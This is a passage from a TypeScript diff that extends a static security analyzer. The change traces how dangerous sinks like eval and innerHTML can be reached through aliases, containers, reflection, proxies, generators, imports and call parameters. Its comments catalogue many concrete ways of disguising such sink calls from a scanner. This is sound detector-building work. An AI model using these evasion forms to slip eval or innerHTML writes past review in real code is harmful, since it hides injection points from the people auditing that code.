+      if (name === undefined || key === undefined) continue;
+      // EVERY write, not just the last: `o.run = eval; o.run(payload);
+      // o.run = safe` runs the sink before it is overwritten, and keeping one
+      // source occurrence per slot lost exactly that.  The relation asks what a
+      // slot CAN hold, which is all of them.
+      const slot = `${key} ${name}`;
+      written.set(slot, [...(written.get(slot) ?? []), value]);
+    }
+  };
+
+  /** Whether an expression IS the global object, directly or through a name. */
+  const isGlobalReceiver = (node: Syntax | undefined, hop = 0): boolean => {
+    const target = unwrap(node);
+    if (target === undefined || hop > MAX_HOPS) return false;
+    if (target.kind !== SyntaxKind.Identifier) return false;
+    if (isGlobalBinding(target)) return GLOBAL_RECEIVERS.has(nameOf(target));
+    const declaration = localDeclaration(target);
+    if (declaration?.kind !== SyntaxKind.VariableDeclaration) return false;
+    return isGlobalReceiver(declaration.initializer, hop + 1);
+  };
+
+  /**
+   * The key a binding element takes from its source — a NAME in an object
+   * pattern, a POSITION in an array one.
+   */
+  const bindingKey = (element: Syntax, pattern: Syntax): string | undefined => {
+    if (pattern.kind === SyntaxKind.ArrayBindingPattern) {
+      const at = childrenOf(pattern).findIndex((each) => each.getStart() === element.getStart());
+      return at < 0 ? undefined : String(at);
+    }
+    const named = (element.propertyName ?? element.name) as Syntax | undefined;
+    return named === undefined ? undefined : nameOf(named);
+  };
+
+  /**
+   * The expression a local name was bound TO.
+   *
+   * A declaration binds either from an initializer or from a destructuring
+   * source, and both are the same act — so a container reached through
+   * `const { list } = { list: [eval] }` resolves like one reached through
+   * `const o = { list: [eval] }`.
+   */
+  const boundValue = (declaration: Syntax | undefined, hop: number): Syntax | undefined => {
+    if (declaration === undefined || hop > MAX_HOPS) return undefined;
+    if (declaration.kind === SyntaxKind.BindingElement) {
+      const pattern = declaration.parent;
+      const from = pattern?.parent?.initializer;
+      const key = pattern === undefined ? undefined : bindingKey(declaration, pattern);
+      if (from === undefined || key === undefined) return undefined;
+      return heldAt(from, key, hop + 1);
+    }
+    return declaration.initializer;
+  };
+
+  /**
+   * What a declaration binds, as a VALUE.
+   *
+   * A destructure from the global object names a GLOBAL rather than pointing at
+   * an expression — `const { eval: e } = globalThis` binds `e` to the global
+   * `eval`, which has no node in this file — so the binding edge has to be able
+   * to yield either.  Returning only a node silently dropped that whole family.
+   */
+  const boundValues = (declaration: Syntax | undefined): Value[] => {
+    if (declaration === undefined) return [];
+    // A `function get() {}` / `class C {}` declaration IS the value its name
+    // holds — there is no initializer to read.  The old return-walker knew this
+    // privately, which is precisely why it had to exist; stated here, every
+    // consumer of the relation gets it at once.
+    if (isFunction(declaration) || declaration.kind === SyntaxKind.ClassDeclaration) {
+      return [nodeValue(declaration)];
+    }
+    if (declaration.kind === SyntaxKind.BindingElement) {
+      const pattern = declaration.parent;
+      const from = pattern?.parent?.initializer;
+      const key = pattern === undefined ? undefined : bindingKey(declaration, pattern);
+      if (from === undefined || key === undefined) return [];
+      if (isGlobalReceiver(from)) return [globalValue(key)];
+      const held = heldAt(from, key, 0);
+      return held === undefined ? [] : [nodeValue(held)];
+    }
+    return declaration.initializer === undefined ? [] : [nodeValue(declaration.initializer)];
+  };
+
+  /**
+   * The container LITERAL an expression denotes, however it is reached.
+   *
+   * A container holds containers — `const h = [[eval]]` and `const o = { list:
+   * [eval] }` are as ordinary as the one-level forms — so this recurses rather
+   * than reading one level and stopping, which is the caveat that becomes the
+   * next bypass.
+   */
+  const containerCache = new Map<string, Syntax | undefined>();
+  const containerOf = (node: Syntax | undefined, hop: number): Syntax | undefined => {
+    const target = unwrap(node);
+    if (target === undefined || hop > MAX_HOPS) return undefined;
+    // Memoised: `heldValues`, `members` and the fluent-target resolution all
+    // ask this, and the relation asks them per property access.
+    const key = `${target.getStart()}:${target.getEnd()}`;
+    if (containerCache.has(key)) return containerCache.get(key);
+    containerCache.set(key, undefined); // cycle guard while this one resolves
+    const found = containerFrom(target, hop);
+    containerCache.set(key, found);
+    return found;
+  };
+
+  const containerFrom = (target: Syntax, hop: number): Syntax | undefined => {
+    if (
+      target.kind === SyntaxKind.ObjectLiteralExpression ||
+      target.kind === SyntaxKind.ArrayLiteralExpression
+    ) {
+      return target;
+    }
+    if (target.kind === SyntaxKind.Identifier) {
+      const declaration = localDeclaration(target);
+      // A class NAME denotes the class; `new C()` denotes an instance of it.
+      // Either way its members are what a property read finds.
+      if (
+        declaration?.kind === SyntaxKind.ClassDeclaration ||
+        declaration?.kind === SyntaxKind.ClassExpression
+      ) {
+        return declaration;
+      }
+      return containerOf(boundValue(declaration, hop), hop + 1);
+    }
+    if (target.kind === SyntaxKind.NewExpression) {
+      return containerOf(target.expression, hop + 1);
+    }
+    // `Object.create(proto)` returns an object that INHERITS from `proto`, so
+    // a property read on it finds what the prototype holds — the one container
+    // here reached across a prototype boundary rather than by ownership.
+    if (target.kind === SyntaxKind.CallExpression) {
+      for (const callee of accessesBehind(target.expression)) {
+        if (propertyName(callee) !== 'create') continue;
+        if (!isGlobalNamed(callee.expression, 'Object')) continue;
+        return containerOf(argumentsOf(target)[0], hop + 1);
+      }
+    }
+    // A reflective setter RETURNS its target, so the fluent form denotes the
+    // same container the write landed in.
+    if (target.kind === SyntaxKind.CallExpression && reflectiveWrites(target).length > 0) {
+      return containerOf(argumentsOf(target)[0], hop + 1);
+    }
+    if (
+      target.kind === SyntaxKind.PropertyAccessExpression ||
+      target.kind === SyntaxKind.ElementAccessExpression
+    ) {
+      const name = propertyName(target);
+      const base = target.expression;
+      if (name === undefined || base === undefined) return undefined;
+      return containerOf(heldAt(base, name, hop + 1), hop + 1);
+    }
+    return undefined;
+  };
+
+  /** What a container holds at `name` — from a later write, or from its literal. */
+  const heldAt = (base: Syntax, name: string, hop: number): Syntax | undefined =>
+    heldValues(base, name, hop)[0];
+
+  /** EVERY value a slot can hold — writes first, then what the literal says. */
+  const heldValues = (base: Syntax, name: string, hop: number): Syntax[] => {
+    const key = receiverKey(base);
+    const assigned = key === undefined ? [] : (written.get(`${key} ${name}`) ?? []);
+    if (assigned.length > 0) return assigned;
+    if (hop > MAX_HOPS) return [];
+    // The write may have been keyed to the CONTAINER rather than to the
+    // expression naming it: `Object.assign({}, { run: eval }).run(p)` records
+    // against the anonymous literal, and the read arrives through the call
+    // that returned it.
+    const literal = containerOf(base, hop);
+    const holderKey = literal === undefined ? undefined : receiverKey(literal);
+    if (holderKey !== undefined && holderKey !== key) {
+      const viaHolder = written.get(`${holderKey} ${name}`) ?? [];
+      if (viaHolder.length > 0) return viaHolder;
+    }
+    // `Proxy.revocable(target, handler)` hands back `{ proxy, revoke }`, and
+    // its `proxy` IS the target — the only container in this file that is
+    // built by a call rather than written as a literal, so nothing else could
+    // reach it.
+    if (name === 'proxy') {
+      const call = unwrap(base);
+      if (call?.kind === SyntaxKind.CallExpression) {
+        for (const callee of accessesBehind(call.expression)) {
+          if (!isGlobalNamed(callee.expression, 'Proxy')) continue;
+          if (propertyName(callee) !== 'revocable') continue;
+          const wrapped = argumentsOf(call)[0];
+          if (wrapped !== undefined) return [wrapped];
+        }
+      }
+    }
+    // `const o = { run: eval }`, `const h = [eval]`, and the nested forms —
+    // reached through the binding rather than through a table beside the scan.
+    if (literal === undefined) return [];
+    if (literal.kind === SyntaxKind.ObjectLiteralExpression) {
+      for (const member of childrenOf(literal)) {
+        if (member.name === undefined) continue;
+        // `{ ['run']: eval }` names the same property as `{ run: eval }`.
+        const memberName =
+          member.name.kind === SyntaxKind.ComputedPropertyName
+            ? staticPrefix(member.name.expression)
+            : nameOf(member.name);
+        if (memberName !== name) continue;
+        // A getter has no initializer; the MEMBER is the value, and the
+        // relation reads its returns.  A method likewise IS the function.
+        if (
+          member.kind === SyntaxKind.GetAccessor ||
+          member.kind === SyntaxKind.MethodDeclaration
+        ) {
+          return [member];
+        }
+        const held =
+          member.kind === SyntaxKind.ShorthandPropertyAssignment ? member.name : member.initializer;
+        return held === undefined ? [] : [held];
+      }
+      return [];
+    }
+    if (literal.kind === SyntaxKind.ArrayLiteralExpression) {
+      const index = Number(name);
+      const at = Number.isInteger(index) ? childrenOf(literal)[index] : undefined;
+      return at === undefined ? [] : [at];
+    }
+    if (
+      literal.kind === SyntaxKind.ClassDeclaration ||
+      literal.kind === SyntaxKind.ClassExpression
+    ) {
+      // A method IS the function it declares; a property carries its
+      // initializer; a getter is read through the relation as its returns.
+      for (const member of childrenOf(literal)) {
+        if (member.name === undefined || nameOf(member.name) !== name) continue;
+        if (
+          member.kind === SyntaxKind.MethodDeclaration ||
+          member.kind === SyntaxKind.GetAccessor
+        ) {
+          return [member];
+        }
+        if (member.kind === SyntaxKind.PropertyDeclaration) {
+          return member.initializer === undefined ? [] : [member.initializer];
+        }
+      }
+      return [];
+    }
+    return [];
+  };
+
+  /**
+   * The expression a `Reflect.apply` / `Reflect.construct` call INVOKES.
+   *
+   * Read through `propertyName`, so `Reflect['apply']` is the same call as the
+   * dotted spelling rather than a second case.
+   */
+  /**
+   * `Function.prototype.call.call(eval, …)` — a BORROWED invoker.
+   *
+   * `f.call(thisArg, …)` invokes `f`; when `f` IS `Function.prototype.call` (or
+   * `.apply`), invoking it with `this = args[0]` invokes THAT.  Following the
+   * immediate base stopped at the borrowed method and never saw the callable
+   * handed to it.
+   */
+  const borrowedTarget = (call: Syntax): Syntax | undefined => {
+    const callee = unwrap(call.expression);
+    if (
+      callee?.kind !== SyntaxKind.PropertyAccessExpression &&
+      callee?.kind !== SyntaxKind.ElementAccessExpression
+    ) {
+      return undefined;
+    }
+    if (!INVOKERS.has(propertyName(callee) ?? '')) return undefined;
+    for (const inner of accessesBehind(callee.expression)) {
+      if (!INVOKERS.has(propertyName(inner) ?? '')) continue;
+      // The receiver of the borrowed method is `Function.prototype`.
+      const owner = unwrap(inner.expression);
+      if (owner === undefined) continue;
+      const onPrototype =
+        (owner.kind === SyntaxKind.PropertyAccessExpression ||
+          owner.kind === SyntaxKind.ElementAccessExpression) &&
+        propertyName(owner) === 'prototype' &&
+        isGlobalNamed(owner.expression, 'Function');
+      if (!onPrototype) continue;
+      return argumentsOf(call)[0];
+    }
+    return undefined;
+  };
+
+  const reflectTarget = (call: Syntax): Syntax | undefined => {
+    const borrowed = borrowedTarget(call);
+    if (borrowed !== undefined) return borrowed;
+    for (const callee of accessesBehind(call.expression)) {
+      if (!isGlobalNamed(callee.expression, 'Reflect')) continue;
+      const method = propertyName(callee);
+      if (method === undefined || !REFLECT_INVOKERS.has(method)) continue;
+      return argumentsOf(call)[0];
+    }
+    return undefined;
+  };
+
+  /**
+   * The property ACCESSES an expression can denote.
+   *
+   * `Reflect.construct` and `Object.assign` are values like any other, so
+   * copying one into a local, passing it to a wrapper, or returning it from a
+   * function all reach the same helper — and matching the ACCESS SYNTAX at the
+   * call saw only the spelled form.
+   *
+   * This asks the RELATION, which is the whole point: a private walk here
+   * covered bindings and nothing else, which is the same defect the value
+   * relation was introduced to end, reintroduced one helper down.  The relation
+   * asks about every call, so it would re-enter this function — hence the
+   * in-progress guard rather than a weaker resolver.
+   */
+  const accessCache = new Map<string, Syntax[]>();
+  const accessesBehind = (node: Syntax | undefined, hop = 0): Syntax[] => {
+    const target = unwrap(node);
+    if (target === undefined || hop > MAX_HOPS) return [];
+    const key = `${target.getStart()}:${target.getEnd()}`;
+    const cached = accessCache.get(key);
+    if (cached !== undefined) return cached;
+    const found: Syntax[] = [];
+    accessCache.set(key, found); // cycle guard: a chain returning here sees it empty
+    const add = (from: Syntax | undefined): void => {
+      for (const each of accessesBehind(from, hop + 1)) found.push(each);
+    };
+    if (
+      target.kind === SyntaxKind.PropertyAccessExpression ||
+      target.kind === SyntaxKind.ElementAccessExpression
+    ) {
+      found.push(target);
+      // …and whatever the slot HOLDS, which may itself be a helper:
+      // `const o = { a: Object.assign }; o.a(node, { innerHTML: p })`.
+      const name = propertyName(target);
+      const base = target.expression;
+      if (name !== undefined && base !== undefined) {
+        for (const held of heldValues(base, name, hop + 1)) add(held);
+      }
+      return found;
+    }
+    if (target.kind === SyntaxKind.ConditionalExpression) {
+      add(target.whenTrue);
+      add(target.whenFalse);
+      return found;
+    }
+    if (
+      target.kind === SyntaxKind.BinaryExpression &&
+      SELECTORS.has(target.operatorToken?.kind ?? -1)
+    ) {
+      add(target.left);
+      add(target.right);
+      return found;
+    }
+    // A CALL yields what the function it names returns.
+    if (target.kind === SyntaxKind.CallExpression) {
+      for (const fn of accessCallees(target, hop)) {
+        for (const returned of returnsOf(fn)) add(returned);
+      }
+      return found;
+    }
+    if (target.kind !== SyntaxKind.Identifier || isGlobalBinding(target)) return found;
+    const receiver = receiverKey(target);
+    for (const assigned of receiver === undefined ? [] : (rebound.get(receiver) ?? []))
+      add(assigned);
+    const declaration = localDeclaration(target);
+    if (declaration === undefined) return found;
+    if (IMPORT_BINDINGS.has(declaration.kind)) {
+      for (const value of aliasedValues(target)) {
+        if (value.kind === 'node') add(value.node);
+      }
+      return found;
+    }
+    // A PARAMETER is bound by its call sites.
+    if (declaration.kind === SyntaxKind.Parameter) {
+      for (const supplied of argumentsAt(declaration)) add(supplied);
+      add(declaration.initializer);
+      return found;
+    }
+    add(declaration.initializer);
+    return found;
+  };
+
+  /** The FUNCTIONS a callee expression can be, for the return hop above. */
+  const accessCallees = (call: Syntax, hop: number): Syntax[] => {
+    const callee = unwrap(call.expression);
+    if (callee === undefined || hop > MAX_HOPS) return [];
+    if (isFunction(callee)) return [callee];
+    if (callee.kind !== SyntaxKind.Identifier || isGlobalBinding(callee)) return [];
+    const declaration = localDeclaration(callee);
+    if (declaration === undefined) return [];
+    if (isFunction(declaration)) return [declaration];
+    const bound = unwrap(declaration.initializer);
+    return bound !== undefined && isFunction(bound) ? [bound] : [];
+  };
+
+  /**
+   * Whether an expression IS the named global, however it was reached.
+   *
+   * `Reflect`, `Object` and `Proxy` are values too — `const P = Proxy; new
+   * P(eval, {})` constructs the same proxy — so comparing the identifier's TEXT
+   * left every receiver aliasable even after the helpers themselves were
+   * resolved.  Guarded like the other resolutions here, because the relation
+   * asks this question while answering one.
+   */
+  const isGlobalNamed = (node: Syntax | undefined, name: string): boolean =>
+    globalsBehind(node).has(name);
+
+  /**
+   * The GLOBALS an expression can denote, following binding chains.
+   *
+   * A narrower question than "what values can this be", and deliberately
+   * answered by its own memoised walk rather than by the general relation.
+   * This is called from INSIDE `flowsInto` — for every call, to ask whether the
+   * receiver is `Reflect`, `Object` or `Proxy` — so routing it through the full
+   * search made the step function depend on the search's own closure, and a
+   * repository scan went from 25 seconds to over ten minutes.
+   *
+   * It follows exactly what can rename a global: a binding, a reassignment, an
+   * import, a selection between two of them, and the transparent wrappers.
+   * That is what `const P = Proxy; new P(eval, {})` needs, and it stays linear.
+   */
+  const globalsCache = new Map<string, Set<string>>();
+  const globalsBehind = (node: Syntax | undefined, hop = 0): Set<string> => {
+    const target = unwrap(node);
+    if (target === undefined || hop > MAX_HOPS) return new Set();
+    const key = `${target.getStart()}:${target.getEnd()}`;
+    const cached = globalsCache.get(key);
+    if (cached !== undefined) return cached;
+    const found = new Set<string>();
+    globalsCache.set(key, found); // cycle guard: a chain that returns here sees it empty
+    if (target.kind === SyntaxKind.Identifier) {
+      if (isGlobalBinding(target)) {
+        found.add(nameOf(target));
+        return found;
+      }
+      const receiver = receiverKey(target);
+      for (const assigned of receiver === undefined ? [] : (rebound.get(receiver) ?? [])) {
+        for (const each of globalsBehind(assigned, hop + 1)) found.add(each);
+      }
+      const declaration = localDeclaration(target);
+      if (declaration !== undefined && IMPORT_BINDINGS.has(declaration.kind)) {
+        for (const value of aliasedValues(target)) {
+          if (value.kind === 'global') found.add(value.name);
+          else if (value.kind === 'node') {
+            for (const each of globalsBehind(value.node, hop + 1)) found.add(each);
+          }
+        }
+        return found;
+      }
+      for (const each of globalsBehind(declaration?.initializer, hop + 1)) found.add(each);
+      return found;
+    }
+    if (target.kind === SyntaxKind.ConditionalExpression) {
+      for (const side of [target.whenTrue, target.whenFalse]) {
+        for (const each of globalsBehind(side, hop + 1)) found.add(each);
+      }
+      return found;
+    }
+    if (
+      target.kind === SyntaxKind.BinaryExpression &&
+      SELECTORS.has(target.operatorToken?.kind ?? -1)
+    ) {
+      for (const side of [target.left, target.right]) {
+        for (const each of globalsBehind(side, hop + 1)) found.add(each);
+      }
+    }
+    return found;
+  };
+
+  /** What an imported name is bound to, followed through the module edge. */
+  const aliasedValues = (name: Syntax): Value[] => {
+    const symbol = symbolAt(name);
+    if (symbol === undefined) return [];
+    let aliased: ReturnType<typeof project.checker.getAliasedSymbol>;
+    try {
+      aliased = project.checker.getAliasedSymbol(symbol);
+    } catch {
+      return [];
+    }
+    const handle = aliased?.declarations.find((each) => inBatch(each.path));
+    const declaration = handle?.resolve(project) as Syntax | undefined;
+    if (declaration === undefined) return [];
+    // The ORIGINAL declaration is read exactly as a local one would be, so a
+    // re-export chain and a plain import take the same path from here.
+    return boundValues(declaration);
+  };
+
+  /** Whether a node is something that can be CALLED and has a body to read. */
+  const isFunction = (node: Syntax | undefined): boolean =>
+    node?.kind === SyntaxKind.ArrowFunction ||
+    node?.kind === SyntaxKind.FunctionExpression ||
+    node?.kind === SyntaxKind.FunctionDeclaration ||
+    node?.kind === SyntaxKind.MethodDeclaration;
+
+  /**
+   * ARGUMENTS that reach each parameter, keyed by the parameter's range.
+   *
+   * A parameter is a binding like any other, and passing a sink to a wrapper —
+   * `function invoke(fn) { fn(payload) } invoke(eval)` — is how one is written
+   * through in practice.  Without this edge the relation stopped dead at every
+   * parameter, so any indirection through a local helper was a bypass.
+   */
+  const argumentsForParameter = new Map<string, Syntax[]>();
+  /**
+   * Whether the call-site map is being built, which is what makes this
+   * terminate.
+   *
+   * Building the map needs to know which function each call reaches, and that
+   * is the relation itself — so parameter edges yield nothing WHILE the map is
+   * being built and everything afterwards.  The one thing this cannot see is a
+   * callee that is itself a parameter (a wrapper invoked through a wrapper);
+   * the arguments of such a call are still followed, only the dispatch is not.
+   */
+  let buildingCallSites = false;
+  let callSitesReady = false;
+
+  const parameterKey = (parameter: Syntax): string =>
+    `${parameter.getStart()}:${parameter.getEnd()}`;
+
+  /**
+   * The arguments a call actually passes to the FUNCTION, whatever invoked it.
+   *
+   * `f(a)`, `f.call(this, a)`, `f.apply(this, [a])` and `Reflect.apply(f, this,
+   * [a])` all deliver `a` as the first parameter, and the receiver resolution
+   * already treats them as calls of `f` — so reading the raw argument list
+   * lined a wrapper's parameters up against a `thisArg`, and the sink one place
+   * along went unseen.
+   */
+  const callArguments = (call: Syntax): Syntax[] => {
+    const unwrapArray = (node: Syntax | undefined): Syntax[] => {
+      const holder = unwrap(node);
+      return holder?.kind === SyntaxKind.ArrayLiteralExpression ? childrenOf(holder) : [];
+    };
+    // A TAG is called with the strings object first and each SUBSTITUTION
+    // after it, so `` invoke`x${eval}y` `` puts the sink in parameter 1.  The
+    // ordinary argument list is empty for a tagged template, which left every
+    // substitution disconnected from the parameter it binds.
+    if (call.kind === SyntaxKind.TaggedTemplateExpression) {
+      const template = childrenOf(call)[1];
+      if (template === undefined) return [];
+      const substitutions: Syntax[] = [];
+      for (const span of childrenOf(template)) {
+        if (span.kind !== SyntaxKind.TemplateSpan) continue;
+        const value = childrenOf(span)[0];
+        if (value !== undefined) substitutions.push(value);
+      }
+      // Index 0 stands for the strings object; the template node is a harmless
+      // placeholder that resolves to no sink.
+      return [template, ...substitutions];
+    }
+    const args = argumentsOf(call);
+    if (reflectTarget(call) !== undefined) {
+      const method = propertyName(unwrap(call.expression) as Syntax) ?? '';
+      // `construct` takes its array one earlier than `apply` does.
+      return unwrapArray(args[method === 'construct' ? 1 : 2]);
+    }
+    const callee = unwrap(call.expression);
+    if (
+      callee?.kind === SyntaxKind.PropertyAccessExpression ||
+      callee?.kind === SyntaxKind.ElementAccessExpression
+    ) {
+      const method = propertyName(callee);
+      if (method === 'apply') return unwrapArray(args[1]);
+      if (method === 'call' || method === 'bind') return args.slice(1);
+    }
+    return args;
+  };
+
+  const buildCallSites = (): void => {
+    if (callSitesReady || buildingCallSites) return;
+    buildingCallSites = true;
+    for (const node of walk(root)) {
+      if (
+        node.kind !== SyntaxKind.CallExpression &&
+        node.kind !== SyntaxKind.NewExpression &&
+        node.kind !== SyntaxKind.TaggedTemplateExpression
+      ) {
+        continue;
+      }
+      // `arr.forEach(fn => …)` hands each ELEMENT to the callback, so its
+      // first parameter is bound by the receiver rather than by an argument at
+      // the same index.  Without this a sink stored in a collection reached the
+      // callback untracked.
+      const iterated = iterationSource(node);
+      if (iterated !== undefined) {
+        const callback = unwrap(argumentsOf(node)[0]);
+        if (callback !== undefined && isFunction(callback)) {
+          const parameter = childrenOf(callback).find(
+            (child) => child.kind === SyntaxKind.Parameter,
+          );
+          if (parameter !== undefined) {
+            const key = parameterKey(parameter);
+            for (const element of elementsOf(iterated)) {
+              argumentsForParameter.set(key, [...(argumentsForParameter.get(key) ?? []), element]);
             }
           }
         }
+      }
+      const args = callArguments(node);
+      if (args.length === 0) continue;
+      // WHERE the called function is written differs by spelling: a tagged
+      // template puts it in the tag, and `Reflect.apply` in its first argument
+      // rather than in the callee.  The relation already resolves all three;
+      // reading only `expression` here left the reflective form unmapped.
+      const invokedFn =
+        node.kind === SyntaxKind.TaggedTemplateExpression
+          ? node.tag
+          : (reflectTarget(node) ?? node.expression);
+      for (const callee of nodesFrom(invokedFn)) {
+        if (!isFunction(callee)) continue;
+        childrenOf(callee)
+          .filter((child) => child.kind === SyntaxKind.Parameter)
+          .forEach((parameter, index) => {
+            const supplied = args[index];
+            if (supplied === undefined) return;
+            const key = parameterKey(parameter);
+            argumentsForParameter.set(key, [...(argumentsForParameter.get(key) ?? []), supplied]);
+          });
+      }
+    }
+    buildingCallSites = false;
+    callSitesReady = true;
+  };
+
+  /**
+   * Methods that hand each ELEMENT of their receiver to a callback.
+   *
+   * A closed set of platform APIs, named for the same reason the reflective
+   * setters are: no parse answers "does this iterate", and the list does not
+   * grow with the language the way a spelling list would.
+   */
+  const ITERATORS: ReadonlySet<string> = new Set([
+    'forEach',
+    'map',
+    'filter',
+    'find',
+    'findLast',
+    'some',
+    'every',
+    'flatMap',
+  ]);
+
+  /** The collection an iteration call walks, when it is one. */
+  const iterationSource = (call: Syntax): Syntax | undefined => {
+    const callee = unwrap(call.expression);
+    if (
+      callee?.kind !== SyntaxKind.PropertyAccessExpression &&
+      callee?.kind !== SyntaxKind.ElementAccessExpression
+    ) {
+      return undefined;
+    }
+    if (!ITERATORS.has(propertyName(callee) ?? '')) return undefined;
+    return callee.expression;
+  };
+
+  /** The elements an array-valued expression holds. */
+  const elementsOf = (node: Syntax): Syntax[] => {
+    const literal = containerOf(node, 0);
+    return literal?.kind === SyntaxKind.ArrayLiteralExpression ? childrenOf(literal) : [];
+  };
+
+  /** The arguments that can arrive at a parameter, across every call site. */
+  const argumentsAt = (parameter: Syntax): Syntax[] => {
+    if (buildingCallSites) return [];
+    buildCallSites();
+    return argumentsForParameter.get(parameterKey(parameter)) ?? [];
+  };
+
+  /**
+   * The expressions a function BODY hands back.
+   *
+   * Both body forms count: an arrow's expression body, and every `return` in a
+   * block.  Nested functions are excluded — their returns belong to them, not
+   * to the function being called.
+   */
+  const returnsOf = (fn: Syntax): Syntax[] => {
+    const body = fn.body;
+    if (body === undefined) return [];
+    if (body.kind !== SyntaxKind.Block) return [body];
+    const returned: Syntax[] = [];
+    // Explicit recursion rather than a flat walk, because a nested function's
+    // `return` has to be PRUNED, not skipped: it belongs to that function, and
+    // `f()` does not yield what the arrow inside `f` returns.  Nothing is lost
+    // by the precision — `f()()` reaches it as a `result` of a `result`.
+    const visit = (node: Syntax): void => {
+      if (isFunction(node)) return;
+      // A GENERATOR hands values out by yielding, so a yield is a return for
+      // this purpose: `function* g() { yield eval }` gives the global to
+      // whoever reads the iterator.
+      if (node.kind === SyntaxKind.ReturnStatement || node.kind === SyntaxKind.YieldExpression) {
+        if (node.expression !== undefined) returned.push(node.expression);
+        if (node.kind === SyntaxKind.YieldExpression) return;
+        return;
+      }
+      for (const child of childrenOf(node)) visit(child);
+    };
+    for (const child of childrenOf(body)) visit(child);
+    return returned;
+  };
+
+  /**
+   * ONE STEP of value flow: everything that can supply this value.
+   *
+   * This is the whole model, and it is one relation on purpose.  It replaced
+   * three overlapping walkers — one for selection and bindings, one for sink
+   * names, one for containers — which is why every review round found another
+   * mechanism modelled in one of them and missing from the others: a `||` the
+   * name walker knew and the string test did not, a function RETURN the sink
+   * walker knew and the value walker did not, a container alias the write side
+   * knew and the read side did not.  Enumerating dataflow mechanisms three
+   * times over is the same mistake as enumerating spellings, one level up.
+   *
+   * An EDGE means "this value IS that value".  Construction is deliberately not
+   * an edge: `a + b` and a template make a NEW value out of their parts, so the
+   * predicates that care about strings read those shapes structurally instead.
+   */
+  const flowsInto = (value: Value): Value[] => {
+    // A global and a member are IDENTITIES, not expressions: nothing flows into
+    // them, they are where a resolution ends.
+    if (value.kind === 'global' || value.kind === 'member') return [];
+
+    // Calling a value: read a function's returns, or push the call INWARDS
+    // through the callee's own flow until one is found.  Distributing like this
+    // is what makes every callee spelling work at once — an alias, a property,
+    // a parameter, a `||` between two functions — without any of them being
+    // named here.
+    if (value.kind === 'result') {
+      const of = value.of;
+      if (of.kind === 'node' && isFunction(of.node)) return returnsOf(of.node).map(nodeValue);
+      return flowsInto(of).map(resultValue);
+    }
+
+    const target = value.node;
+
+    // Wrappers that yield exactly what they wrap.
+    if (TRANSPARENT.has(target.kind) || target.kind === SyntaxKind.AwaitExpression) {
+      return target.expression === undefined ? [] : [nodeValue(target.expression)];
+    }
+
+    if (target.kind === SyntaxKind.BinaryExpression) {
+      const operator = target.operatorToken?.kind ?? -1;
+      // `(0, eval)` yields its right operand; `||`/`&&`/`??` yield either.
+      if (operator === SyntaxKind.CommaToken) {
+        return target.right === undefined ? [] : [nodeValue(target.right)];
+      }
+      if (SELECTORS.has(operator)) {
+        return [target.left, target.right]
+          .filter((side): side is Syntax => side !== undefined)
+          .map(nodeValue);
+      }
+      return [];
+    }
+
+    if (target.kind === SyntaxKind.ConditionalExpression) {
+      return [target.whenTrue, target.whenFalse]
+        .filter((side): side is Syntax => side !== undefined)
+        .map(nodeValue);
+    }
+
+    if (target.kind === SyntaxKind.Identifier) {
+      if (isGlobalBinding(target)) return [globalValue(nameOf(target))];
+      const from: Value[] = [];
+      // A later assignment reaches a name just as its initializer does.
+      const key = receiverKey(target);
+      for (const assigned of key === undefined ? [] : (rebound.get(key) ?? [])) {
+        from.push(nodeValue(assigned));
+      }
+      const declaration = localDeclaration(target);
+      // An IMPORT binds to a declaration in ANOTHER module, and the checker is
+      // what crosses that edge: the specifier itself holds nothing, so a chain
+      // that stopped there read `import { run } from './a.js'; run(payload)` as
+      // an unresolvable name — which is how a sink aliased in one file and
+      // invoked from another showed no finding in either.
+      if (declaration !== undefined && IMPORT_BINDINGS.has(declaration.kind)) {
+        from.push(...aliasedValues(target));
+        return from;
+      }
+      // A PARAMETER is bound by its call sites rather than by an initializer.
+      if (declaration?.kind === SyntaxKind.Parameter) {
+        from.push(...argumentsAt(declaration).map(nodeValue));
+        const fallback = declaration.initializer;
+        if (fallback !== undefined) from.push(nodeValue(fallback));
+        return from;
+      }
+      from.push(...boundValues(declaration));
+      return from;
+    }
+
+    if (
+      target.kind === SyntaxKind.PropertyAccessExpression ||
+      target.kind === SyntaxKind.ElementAccessExpression
+    ) {
+      const name = propertyName(target);
+      const base = target.expression;
+      if (name === undefined || base === undefined) return [];
+      const from: Value[] = [];
+      // What was WRITTEN into this slot, and what its literal holds — ALL of
+      // them, since the question is what the slot can hold rather than what it
+      // holds last.
+      for (const held of heldValues(base, name, 0)) from.push(nodeValue(held));
+      if (isGlobalReceiver(base)) from.push(globalValue(name));
+      // `F.call(…)` still runs `F`; an invoked `.constructor` is `Function`.
+      if (INVOKERS.has(name)) from.push(nodeValue(base));
+      if (name === 'constructor') from.push(globalValue('Function'));
+      // `it.value` carries what the iterator produced, so it is transparent to
+      // its source — the other half of the generator boundary, with `.next()`
+      // below.
+      if (name === 'value') from.push(nodeValue(base));
+      // The access ALSO denotes the method itself, whoever the receiver turns
+      // out to be — which is what survives being copied into a local.  Emitted
+      // alongside the rest rather than instead of it, and harmless when the
+      // property is nobody's sink: only a spec naming this property and
+      // resolving to this receiver ever reads it.
+      from.push(memberValue(target, name));
+      return from;
+    }
+
+    if (target.kind === SyntaxKind.CallExpression || target.kind === SyntaxKind.NewExpression) {
+      // `Reflect.apply(F, …)` invokes its first argument; any other call yields
+      // whatever the function it names RETURNS.
+      const invoked = reflectTarget(target);
+      if (invoked !== undefined) return [nodeValue(invoked)];
+      // `Object.assign(o, …)` and `Object.defineProperty(o, …)` RETURN their
+      // target, so the fluent form `Object.assign({}, { run: eval }).run(p)`
+      // reads the slot off the call itself.  The generic result edge follows a
+      // function's declared returns and these are the platform's, not ours.
+      if (reflectiveWrites(target).length > 0) {
+        const written = argumentsOf(target)[0];
+        if (written !== undefined) return [nodeValue(written)];
+      }
+      const callee = unwrap(target.expression);
+      // `m.get('run')` reads the slot `m.set('run', …)` filled.
+      if (
+        (callee?.kind === SyntaxKind.PropertyAccessExpression ||
+          callee?.kind === SyntaxKind.ElementAccessExpression) &&
+        propertyName(callee) === 'get' &&
+        callee.expression !== undefined
+      ) {
+        const key = argumentsOf(target)[0];
+        const named = key === undefined ? null : staticPrefix(key);
+        if (named !== null) {
+          const held = heldValues(callee.expression, named, 0);
+          if (held.length > 0) return held.map(nodeValue);
+        }
+      }
+      // `it.next()` yields the iterator's own values, so the call is
+      // transparent to the thing being iterated.
+      if (
+        (callee?.kind === SyntaxKind.PropertyAccessExpression ||
+          callee?.kind === SyntaxKind.ElementAccessExpression) &&
